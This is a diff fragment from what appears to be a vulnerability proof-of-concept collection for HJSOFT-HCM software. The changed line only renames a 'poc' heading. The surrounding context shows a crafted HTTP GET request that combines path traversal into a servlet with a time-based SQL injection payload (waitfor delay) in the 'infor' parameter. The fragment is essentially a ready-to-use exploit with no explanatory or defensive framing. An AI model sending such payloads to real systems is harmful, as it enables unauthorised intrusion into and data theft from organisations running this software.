@@ -10,7 +10,7 @@ app="HJSOFT-HCM"
 
 
 
-## poc
+## POC
 
 ```
 GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1';waitfor+delay+'0:0:3'+-- HTTP/1.1
